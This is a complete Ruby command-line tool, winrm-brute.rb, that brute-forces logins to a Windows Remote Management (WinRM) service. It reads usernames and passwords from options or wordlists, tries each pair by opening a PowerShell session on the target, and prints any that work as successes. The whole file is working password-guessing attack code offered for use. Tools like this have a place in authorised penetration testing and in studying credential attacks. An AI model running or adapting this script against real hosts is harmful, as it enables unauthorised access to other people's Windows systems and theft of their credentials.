#!/usr/bin/env ruby
#  Copyright 2020 M. Choji
#
#  Licensed under the Apache License, Version 2.0 (the "License");
#  you may not use this file except in compliance with the License.
#  You may obtain a copy of the License at
#
#      http://www.apache.org/licenses/LICENSE-2.0
#
#  Unless required by applicable law or agreed to in writing, software
#  distributed under the License is distributed on an "AS IS" BASIS,
#  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
#  See the License for the specific language governing permissions and
#  limitations under the License.

require 'optparse'
require 'ostruct'
require 'winrm'

# Extends string class with colorized output
class String
  # colorization
  def colorize(color_code)
    "\e[#{color_code}m#{self}\e[0m"
  end

  def red
    colorize(31)
  end

  def green
    colorize(32)
  end

  def yellow
    colorize(33)
  end

  def blue
    colorize(34)
  end

  def pink
    colorize(35)
  end

  def light_blue
    colorize(36)
  end
end

# Try to login and run a simple command
def try_login(config)
  conn = WinRM::Connection.new(config)
  #conn.logger.level = :debug
  begin
    conn.shell(:powershell) do |shell|
      output = shell.run('$PSVersionTable') do |stdout, stderr|
        #STDOUT.print stdout
        #STDERR.print stderr
      end
      #puts "The script exited with exit code #{output.exitcode}"
    end
  # Silently ignore authorization error
  rescue WinRM::WinRMAuthorizationError
  # Catch all other exceptions
  rescue => e
    puts "Caught exception #{e}: #{e.message}"
  # No exception means success
  else
    return {:user => config[:user], :password => config[:password]}
  end
  return nil
end

# Print a message to show login attempt
def print_attempt(config, quiet)
  puts "Trying #{config[:user]}:#{config[:password]}" unless quiet
end

# Print valid credentials
def check_creds(credentials)
  if credentials
    puts "[SUCCESS] user: #{credentials[:user]} password: #{credentials[:password]}".green
  end
end

# Set a trap to avoid error messages on Ctrl+C
trap "SIGINT" do
  STDERR.puts "Execution interrupted by user"
  exit 130
end

options = OpenStruct.new
options.uri = "/wsman"
options.port = "5985"
options.timeout = 1

optparse = OptionParser.new do |opts|
  opts.banner = "Usage: winrm-brute.rb [options]"
  opts.banner += " HOST"

  opts.on("-u USER",
          "A specific username to authenticate as") do |user|
    options.user = user
  end

  opts.on("-U USERFILE",
          "File containing usernames, one per line") do |userfile|
    options.userfile = userfile
  end

  opts.on("-p PASSWORD",
          "A specific password to authenticate with") do |passwd|
    options.passwd = passwd
  end

  opts.on("-P PASSWORDFILE",
          "File containing passwords, one per line") do |passwdfile|
    options.passwdfile = passwdfile
  end

  opts.on("-t TIMEOUT",
          "Timeout for each attempt, in seconds (default: 1)") do |timeout|
    options.timeout = timeout
  end

  opts.on("-q", "--quiet",
          "Do not write all login attempts") do |quiet|
    options.quiet = quiet
  end

  opts.on("--port=PORT",
          "The target TCP port (default: 5985)") do |port|
    options.port = port
  end

  opts.on("--uri=URI",
          "The URI of the WinRM service (default: /wsman)") do |uri|
    options.uri = uri
  end

  opts.on_tail("-h", "--help", "Show this message") do
    puts opts
    exit
  end
end

# If no arguments are given, show help
if ARGV.empty?
  puts optparse
  exit
end

optparse.parse!

# Check if some username was given
if not (options.user or options.userfile)
  puts "You must define at least one of -u or -U options".red
  puts optparse
  exit(-1)
end

# Check if some password was given
if not (options.passwd or options.passwdfile)
  puts "You must define at least one of -p or -P options".red
  puts optparse
  exit(-1)
end

# Check if host was provided
if ARGV.empty?
  puts "You must specify a target host!".red
  puts optparse
  exit(-1)
end
target = ARGV.pop

# Define general authentication options
auth = {
  endpoint:  "http://#{target}:#{options.port}#{options.uri}",
  operation_timeout: options.timeout,
  receive_timeout: options.timeout + 2,
  retry_limit: 1
}

# Run for a specific user
if options.user
  auth[:user] = options.user
  if options.passwd
    auth[:password] = options.passwd
    print_attempt(auth, options.quiet)
    check_creds(try_login(auth))
  end
  if options.passwdfile
    File.readlines(options.passwdfile, chomp: true).each do |p|
      auth[:password] = p
      print_attempt(auth, options.quiet)
      check_creds(try_login(auth))
    end
  end
end

if options.userfile
  File.readlines(options.userfile, chomp: true).each do |user|
    auth[:user] = user
    if options.passwd
      auth[:password] = options.passwd
      print_attempt(auth, options.quiet)
      check_creds(try_login(auth))
    end
    if options.passwdfile
      File.readlines(options.passwdfile, chomp: true).each do |passwd|
        auth[:password] = passwd
        print_attempt(auth, options.quiet)
        check_creds(try_login(auth))
      end
    end
  end
end
